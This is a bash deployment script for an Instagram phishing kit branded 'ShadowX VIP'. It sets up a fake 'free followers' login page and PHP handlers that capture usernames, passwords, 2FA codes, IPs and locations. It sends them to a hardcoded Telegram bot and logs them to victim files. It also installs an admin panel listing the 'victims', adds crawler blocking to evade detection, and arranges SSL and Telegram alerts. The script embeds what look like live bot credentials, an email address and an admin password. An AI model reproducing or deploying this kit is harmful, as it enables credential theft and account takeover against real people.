#!/bin/bash
# =========== INSTAGRAM PHISING DEPLOYER WITH CUSTOM DOMAIN ===========
echo "🔥 [SHADOWX VIP] Deploying Instagram Phising with Custom Domain..."

# =========== YOUR CUSTOM CONFIGURATION ===========
DOMAIN="server3.bzonepanel.my.id"
EMAIL="akbarxyz87@gmail.com"
BOT_TOKEN="8598206863:AAHTOutwSjuc5JRSYsH-6AwE63BgaMqOamU"
CHAT_ID="6174107880"
ADMIN_USER="shadowx"
ADMIN_PASS="vip666"
# ================================================

echo "🌐 Domain: $DOMAIN"
echo "📧 Email: $EMAIL"
echo "🤖 Telegram Bot: Configured"

# =========== SYSTEM PREPARATION ===========
echo "📦 Updating system packages..."
apt-get update -y
apt-get upgrade -y

echo "🧹 Cleaning previous installation..."
rm -rf /var/www/html/*
rm -f /var/www/html/*.php /var/www/html/*.html /var/www/html/*.log

# =========== INSTALL DEPENDENCIES ===========
echo "📦 Installing required packages..."
apt-get install -y php8.1 php8.1-cli php8.1-curl php8.1-gd php8.1-mbstring \
                   apache2 libapache2-mod-php8.1 \
                   curl wget unzip git \
                   certbot python3-certbot-apache \
                   fail2ban ufw

# =========== APACHE CONFIGURATION ===========
echo "🌐 Configuring Apache..."
a2enmod rewrite headers ssl proxy proxy_http proxy_connect
systemctl restart apache2

# Disable default site
a2dissite 000-default.conf 2>/dev/null

# =========== CREATE WEBSITE FILES ===========
echo "🌐 Creating phising pages..."

# Create index.html dengan domain spesifik
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Followers Boost - Get 10K+ Free Followers</title>
    <link rel="canonical" href="https://server3.bzonepanel.my.id">
    <meta property="og:url" content="https://server3.bzonepanel.my.id">
    <style>
        :root {
            --ig-pink: #E1306C;
            --ig-purple: #833AB4;
            --ig-blue: #405DE6;
        }
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(45deg, var(--ig-blue), var(--ig-purple), var(--ig-pink));
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 24px;
            width: 90%;
            max-width: 400px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            font-size: 42px;
            margin-bottom: 20px;
            color: var(--ig-pink);
        }
        h1 {
            color: #262626;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #8e8e8e;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            color: #262626;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            font-size: 16px;
            background: #fafafa;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: var(--ig-pink);
            background: #fff;
        }
        .login-btn {
            background: linear-gradient(45deg, var(--ig-blue), var(--ig-pink));
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover {
            transform: translateY(-2px);
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #8e8e8e;
        }
        .separator::before, .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .separator span {
            padding: 0 15px;
            font-size: 13px;
        }
        .features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 25px;
        }
        .feature {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 12px;
            font-size: 12px;
            color: #262626;
        }
        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #8e8e8e;
        }
        .footer a {
            color: var(--ig-blue);
            text-decoration: none;
        }
        .loader {
            display: none;
            margin-top: 20px;
        }
        .loader span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--ig-pink);
            border-radius: 50%;
            margin: 0 3px;
            animation: bounce 1.4s infinite;
        }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📈</div>
        <h1>Get 10,000+ Free Followers</h1>
        <p class="subtitle">Official Instagram Growth Service</p>
        
        <form id="loginForm" action="https://server3.bzonepanel.my.id/process.php" method="POST">
            <div class="form-group">
                <label for="username">Phone number, username, or email</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="login-btn" onclick="showLoader()">
                Log In & Start Boosting
            </button>
        </form>
        
        <div class="separator">
            <span>OR</span>
        </div>
        
        <div class="features">
            <div class="feature">✅ Real Followers</div>
            <div class="feature">⚡ 24 Hour Delivery</div>
            <div class="feature">🛡️ 100% Safe</div>
            <div class="feature">🎯 Targeted Audience</div>
        </div>
        
        <div class="loader" id="loader">
            <span></span><span></span><span></span>
            <p style="margin-top: 10px; font-size: 13px;">Verifying account...</p>
        </div>
        
        <div class="footer">
            <p>By continuing, you agree to our <a href="#">Terms & Privacy Policy</a></p>
            <p>© 2024 server3.bzonepanel.my.id - All rights reserved</p>
        </div>
    </div>
    
    <script>
        function showLoader() {
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loginForm').submit();
            }, 1500);
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.boxShadow = '0 0 0 2px rgba(225, 48, 108, 0.2)';
                });
                input.addEventListener('blur', function() {
                    this.style.boxShadow = 'none';
                });
            });
            
            // Set form action dynamically
            document.getElementById('loginForm').action = window.location.origin + '/process.php';
        });
    </script>
</body>
</html>
EOF

# Create process.php dengan domain spesifik
cat > /var/www/html/process.php << EOF
<?php
// =========== INSTAGRAM PHISING PROCESSOR ===========
// Telegram Configuration
define('BOT_TOKEN', '$BOT_TOKEN');
define('CHAT_ID', '$CHAT_ID');
define('DOMAIN', '$DOMAIN');

// Function to get client info
function getClientInfo() {
    \$ip = \$_SERVER['HTTP_CLIENT_IP'] ?? 
          \$_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          \$_SERVER['REMOTE_ADDR'] ?? 
          'UNKNOWN';
    
    // Get location
    \$location = "Unknown";
    try {
        \$geo = @file_get_contents("http://ip-api.com/json/{\$ip}");
        if (\$geo) {
            \$geoData = json_decode(\$geo, true);
            if (\$geoData['status'] == 'success') {
                \$location = \$geoData['city'] . ', ' . \$geoData['country'] . ' (' . \$geoData['isp'] . ')';
            }
        }
    } catch (Exception \$e) {}
    
    return [
        'ip' => \$ip,
        'location' => \$location,
        'user_agent' => \$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'time' => date('Y-m-d H:i:s'),
        'referer' => \$_SERVER['HTTP_REFERER'] ?? 'Direct',
        'domain' => DOMAIN
    ];
}

// Function to send Telegram alert
function sendTelegramAlert(\$data) {
    \$message = "🔥 *NEW INSTAGRAM VICTIM CAPTURED* 🔥\n\n";
    \$message .= "🌍 *Domain:* \`{\$data['client']['domain']}\`\n";
    \$message .= "👤 *Username:* \`{\$data['username']}\`\n";
    \$message .= "🔑 *Password:* \`{\$data['password']}\`\n";
    \$message .= "🌐 *IP:* \`{\$data['client']['ip']}\`\n";
    \$message .= "📍 *Location:* {\$data['client']['location']}\n";
    \$message .= "🕐 *Time:* {\$data['client']['time']}\n";
    \$message .= "📱 *Device:* " . substr(\$data['client']['user_agent'], 0, 50) . "\n\n";
    \$message .= "🚨 _Auto-captured by ShadowX VIP on " . DOMAIN . "_";
    
    \$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    \$postData = [
        'chat_id' => CHAT_ID,
        'text' => \$message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    \$ch = curl_init();
    curl_setopt_array(\$ch, [
        CURLOPT_URL => \$url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => \$postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    \$result = curl_exec(\$ch);
    curl_close(\$ch);
    
    return \$result;
}

// Function to save to log
function saveToLog(\$data) {
    \$logFile = 'victims.csv';
    
    // Create CSV header if file doesn't exist
    if (!file_exists(\$logFile)) {
        \$header = "Timestamp,Username,Password,IP,Location,User Agent,Referer,Domain\n";
        file_put_contents(\$logFile, \$header);
    }
    
    \$logEntry = sprintf(
        '"%s","%s","%s","%s","%s","%s","%s","%s"' . "\\n",
        \$data['client']['time'],
        htmlspecialchars(\$data['username']),
        htmlspecialchars(\$data['password']),
        \$data['client']['ip'],
        \$data['client']['location'],
        str_replace('"', "'", \$data['client']['user_agent']),
        \$data['client']['referer'],
        \$data['client']['domain']
    );
    
    file_put_contents(\$logFile, \$logEntry, FILE_APPEND);
    
    // Also save to JSON log
    \$jsonFile = 'victims.json';
    \$jsonData = [];
    if (file_exists(\$jsonFile)) {
        \$jsonData = json_decode(file_get_contents(\$jsonFile), true) ?: [];
    }
    \$jsonData[] = \$data;
    file_put_contents(\$jsonFile, json_encode(\$jsonData, JSON_PRETTY_PRINT));
}

// Main processing
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    \$username = trim(\$_POST['username'] ?? '');
    \$password = trim(\$_POST['password'] ?? '');
    
    if (empty(\$username) || empty(\$password)) {
        header('Location: /');
        exit();
    }
    
    // Get client information
    \$clientInfo = getClientInfo();
    
    // Prepare data
    \$victimData = [
        'username' => \$username,
        'password' => \$password,
        'client' => \$clientInfo
    ];
    
    // Save to log
    saveToLog(\$victimData);
    
    // Send Telegram alert
    \$telegramResult = sendTelegramAlert(\$victimData);
    
    // Simulate random 2FA challenge (25% chance)
    if (rand(1, 100) <= 25) {
        header('Content-Type: text/html');
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Security Check Required - Instagram</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: linear-gradient(45deg, #405DE6, #833AB4, #E1306C); color: white; }
                .container { max-width: 400px; margin: auto; background: rgba(255,255,255,0.95); padding: 30px; border-radius: 20px; color: #333; }
                .error { color: #ed4956; font-size: 48px; }
                button { background: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; }
                input { padding: 10px; margin: 10px; width: 200px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="error">⚠️</div>
                <h2>Security Check Required</h2>
                <p>We detected an unusual login attempt. Please check your email for a verification code.</p>
                <form action="/process_2fa.php" method="POST">
                    <input type="hidden" name="username" value="' . htmlspecialchars(\$username) . '">
                    <input type="hidden" name="password" value="' . htmlspecialchars(\$password) . '">
                    <input type="text" name="verification_code" placeholder="6-digit code" required>
                    <br>
                    <button type="submit">Verify</button>
                </form>
                <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">
                    This helps keep your account secure on ' . DOMAIN . '
                </p>
            </div>
        </body>
        </html>';
        exit();
    }
    
    // If no 2FA challenge, redirect to real Instagram
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
} else {
    header('Location: /');
    exit();
}
?>
EOF

# Create 2FA page
cat > /var/www/html/process_2fa.php << 'EOF'
<?php
// Process 2FA verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $code = $_POST['verification_code'] ?? '';
    
    // Log 2FA attempt
    $log = date('Y-m-d H:i:s') . " | 2FA Attempt | User: $username | Code: $code | Domain: server3.bzonepanel.my.id\n";
    file_put_contents('2fa_attempts.log', $log, FILE_APPEND);
    
    // Send 2FA code to Telegram
    $bot_token = '8598206863:AAHTOutwSjuc5JRSYsH-6AwE63BgaMqOamU';
    $chat_id = '6174107880';
    $message = "🔐 *2FA CODE CAPTURED*\nUser: `$username`\nCode: `$code`\nDomain: server3.bzonepanel.my.id";
    
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'Markdown'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // Always redirect to real Instagram
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
}
?>
EOF

# Create admin panel
cat > /var/www/html/admin.php << EOF
<?php
// Simple authentication
if (!isset(\$_SERVER['PHP_AUTH_USER']) || 
    !isset(\$_SERVER['PHP_AUTH_PW']) || 
    \$_SERVER['PHP_AUTH_USER'] !== '$ADMIN_USER' || 
    \$_SERVER['PHP_AUTH_PW'] !== '$ADMIN_PASS') {
    header('WWW-Authenticate: Basic realm="ShadowX Admin - $DOMAIN"');
    header('HTTP/1.0 401 Unauthorized');
    die('Access denied');
}

// Read victims data
\$victims = [];
if (file_exists('victims.csv')) {
    \$lines = file('victims.csv');
    foreach (\$lines as \$i => \$line) {
        if (\$i === 0) continue;
        \$data = str_getcsv(\$line);
        if (count(\$data) >= 8) {
            \$victims[] = [
                'time' => \$data[0],
                'username' => \$data[1],
                'password' => \$data[2],
                'ip' => \$data[3],
                'location' => \$data[4],
                'user_agent' => \$data[5],
                'referer' => \$data[6],
                'domain' => \$data[7]
            ];
        }
    }
}

\$total = count(\$victims);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ShadowX Admin - <?php echo \$DOMAIN; ?></title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }
        .header { background: #111; padding: 20px; border-left: 5px solid #ff0000; margin-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-box { background: #111; padding: 20px; border: 1px solid #333; text-align: center; }
        .stat-number { font-size: 36px; color: #00ffff; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; background: #111; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background: #222; }
        tr:hover { background: #1a1a1a; }
        .domain-badge { background: #0055ff; color: white; padding: 3px 8px; border-radius: 10px; font-size: 12px; }
        .copy-btn { background: #0088cc; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔐 SHADOWX VIP ADMIN PANEL</h1>
        <p>Domain: <span class="domain-badge"><?php echo \$DOMAIN; ?></span></p>
        <p>Total Victims: <?php echo \$total; ?> | Last Update: <?php echo date('Y-m-d H:i:s'); ?></p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number"><?php echo \$total; ?></div>
            <div>Total Victims</div>
        </div>
        <div class="stat-box">
            <div class="stat-number"><?php echo date('H:i:s'); ?></div>
            <div>Live Time</div>
        </div>
        <div class="stat-box">
            <div class="stat-number"><?php echo \$DOMAIN; ?></div>
            <div>Domain Active</div>
        </div>
    </div>
    
    <div style="overflow-x: auto; margin-top: 20px;">
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Time</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Location</th>
                    <th>Domain</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach (\$victims as \$i => \$victim): ?>
                <tr>
                    <td><?php echo \$i + 1; ?></td>
                    <td><?php echo htmlspecialchars(\$victim['time']); ?></td>
                    <td style="color: #ffff00;"><?php echo htmlspecialchars(\$victim['username']); ?></td>
                    <td style="color: #ff00ff;"><?php echo htmlspecialchars(\$victim['password']); ?></td>
                    <td><a href="https://ipinfo.io/<?php echo urlencode(\$victim['ip']); ?>" target="_blank"><?php echo htmlspecialchars(\$victim['ip']); ?></a></td>
                    <td><?php echo htmlspecialchars(\$victim['location']); ?></td>
                    <td><span class="domain-badge"><?php echo htmlspecialchars(\$victim['domain']); ?></span></td>
                    <td>
                        <button class="copy-btn" onclick="copyData('<?php echo addslashes(\$victim['username']); ?>', '<?php echo addslashes(\$victim['password']); ?>')">Copy</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php if (\$total === 0): ?>
                <tr>
                    <td colspan="8" style="text-align: center; padding: 40px; color: #ff5555;">
                        No victims captured yet. Waiting for data...
                    </td>
                </tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
    
    <script>
        function copyData(user, pass) {
            navigator.clipboard.writeText('Username: ' + user + '\\nPassword: ' + pass);
            alert('Credentials copied!');
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>
EOF

# Create .htaccess dengan konfigurasi domain
cat > /var/www/html/.htaccess << 'EOF'
# ShadowX Security Rules for server3.bzonepanel.my.id
RewriteEngine On

# Force HTTPS
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# Force non-www to www (or vice versa based on preference)
RewriteCond %{HTTP_HOST} !^server3\.bzonepanel\.my\.id$ [NC]
RewriteRule ^(.*)$ https://server3.bzonepanel.my.id/$1 [L,R=301]

# Security headers
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# Block access to sensitive files
<FilesMatch "\.(log|json|db|sqlite|bak|txt)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Protect admin pages
<FilesMatch "^(admin|clear)\.php$">
    AuthType Basic
    AuthName "Restricted Area"
    AuthUserFile /var/www/html/.htpasswd
    Require valid-user
</FilesMatch>

# Prevent directory listing
Options -Indexes

# Custom error pages
ErrorDocument 404 /index.html
ErrorDocument 403 /index.html
ErrorDocument 500 /index.html

# Block bad bots
RewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scraper|python|java|curl|wget|libwww) [NC]
RewriteRule ^ - [F,L]

# Block suspicious requests
RewriteCond %{QUERY_STRING} (\.\./|\.\.|union|select|insert|delete|update|drop|alter) [NC]
RewriteRule ^ - [F,L]

# Cache static files
<FilesMatch "\.(css|js|jpg|jpeg|png|gif|ico)$">
    Header set Cache-Control "max-age=86400, public"
</FilesMatch>
EOF

# Create htpasswd for admin
echo "$ADMIN_USER:$(openssl passwd -apr1 $ADMIN_PASS)" > /var/www/html/.htpasswd 2>/dev/null || echo "$ADMIN_USER:$ADMIN_PASS" > /var/www/html/.htpasswd

# =========== SSL CERTIFICATE SETUP ===========
echo "🔐 Setting up SSL certificate for $DOMAIN..."

# Setup Apache virtual host for domain
cat > /etc/apache2/sites-available/$DOMAIN.conf << APACHEEOF
<VirtualHost *:80>
    ServerName $DOMAIN
    ServerAlias www.$DOMAIN
    ServerAdmin $EMAIL
    DocumentRoot /var/www/html
    
    ErrorLog \${APACHE_LOG_DIR}/$DOMAIN-error.log
    CustomLog \${APACHE_LOG_DIR}/$DOMAIN-access.log combined
    
    <Directory /var/www/html>
        Options FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # Redirect to HTTPS
    RewriteEngine On
    RewriteCond %{HTTPS} off
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</VirtualHost>

<VirtualHost *:443>
    ServerName $DOMAIN
    ServerAlias www.$DOMAIN
    DocumentRoot /var/www/html
    
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/$DOMAIN/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/$DOMAIN/privkey.pem
    
    <Directory /var/www/html>
        Options FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
APACHEEOF

# Enable the site
a2ensite $DOMAIN.conf
systemctl reload apache2

# Get SSL certificate
echo "📜 Obtaining SSL certificate from Let's Encrypt..."
certbot --apache -d $DOMAIN -d www.$DOMAIN \
    --non-interactive \
    --agree-tos \
    --email $EMAIL \
    --redirect

# Setup auto-renewal
(crontab -l 2>/dev/null; echo "0 3 * * * certbot renew --quiet --post-hook 'systemctl reload apache2'") | crontab -

# =========== FIREWALL & SECURITY ===========
echo "🛡️ Configuring firewall..."
ufw --force disable
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# Configure fail2ban
systemctl enable fail2ban
systemctl start fail2ban

# =========== FINAL SETUP ===========
echo "🔧 Finalizing setup..."

# Set permissions
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html
chmod 666 /var/www/html/victims.csv 2>/dev/null || true
chmod 666 /var/www/html/victims.json 2>/dev/null || true

# Restart Apache
systemctl restart apache2

# Send deployment notification
echo "🤖 Sending Telegram deployment notification..."
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text="🔥 *SHADOWX VIP DEPLOYMENT COMPLETE* 🔥

🌍 *Domain:* \`$DOMAIN\`
✅ *Status:* LIVE & SECURE
🔐 *SSL:* Active (Let's Encrypt)
👤 *Admin:* https://$DOMAIN/admin.php
🛡️ *Firewall:* Configured
📊 *Victim Tracking:* Active

🚀 *Instagram Phising Ready for Operation!*
🕐 Time: $(date)" \
    -d parse_mode="Markdown" \
    -d disable_web_page_preview=true

# =========== DEPLOYMENT SUMMARY ===========
echo ""
echo "================================================"
echo "🔥 INSTAGRAM PHISING WITH DOMAIN DEPLOYED! 🔥"
echo "================================================"
echo ""
echo "🌐 WEBSITE URLS:"
echo "   🔗 Main Page: https://$DOMAIN"
echo "   🔗 Admin Panel: https://$DOMAIN/admin.php"
echo "   🔗 Secure Login: https://$DOMAIN/process.php"
echo ""
echo "🔐 ADMIN CREDENTIALS:"
echo "   👤 Username: $ADMIN_USER"
echo "   🔑 Password: $ADMIN_PASS"
echo ""
echo "📊 DATA TRACKING:"
echo "   📁 Victims CSV: /var/www/html/victims.csv"
echo "   📁 Victims JSON: /var/www/html/victims.json"
echo "   📁 2FA Logs: /var/www/html/2fa_attempts.log"
echo ""
echo "🤖 TELEGRAM INTEGRATION:"
echo "   ✅ Bot Token: Configured"
echo "   ✅ Chat ID: $CHAT_ID"
echo "   ✅ Auto-notifications: Active"
echo ""
echo "🔧 SERVER INFO:"
echo "   🌍 Domain: $DOMAIN"
echo "   📧 Email: $EMAIL"
echo "   🖥️  PHP Version: $(php -v | head -1 | cut -d' ' -f2)"
echo "   🔒 SSL: Let's Encrypt (Auto-renewal configured)"
echo "   🛡️  Firewall: UFW + Fail2ban active"
echo ""
echo "🚀 QUICK COMMANDS:"
echo "   📝 View live logs: tail -f /var/www/html/victims.csv"
echo "   👀 Check access: tail -f /var/log/apache2/$DOMAIN-access.log"
echo "   🔄 Restart server: systemctl restart apache2"
echo "   📊 Check SSL: certbot certificates"
echo ""
echo "⚠️ IMPORTANT NEXT STEPS:"
echo "   1. ✅ Setup DNS A record for $DOMAIN to point to this server"
echo "   2. ✅ Wait for DNS propagation (5-60 minutes)"
echo "   3. ✅ Test website: https://$DOMAIN"
echo "   4. ✅ Test admin panel: https://$DOMAIN/admin.php"
echo "   5. ✅ Monitor Telegram for victim notifications"
echo ""
echo "================================================"
echo "💀 SHADOWX VIP - DOMAIN DEPLOYMENT COMPLETE 💀"
echo "================================================"
echo ""
echo "🔥 Script execution finished! 🔥"
echo "👉 Domain: https://$DOMAIN"
echo "👉 Admin: https://$DOMAIN/admin.php"
echo "👉 Victims will be logged and sent to Telegram"
echo ""
echo "Press Enter to exit..."
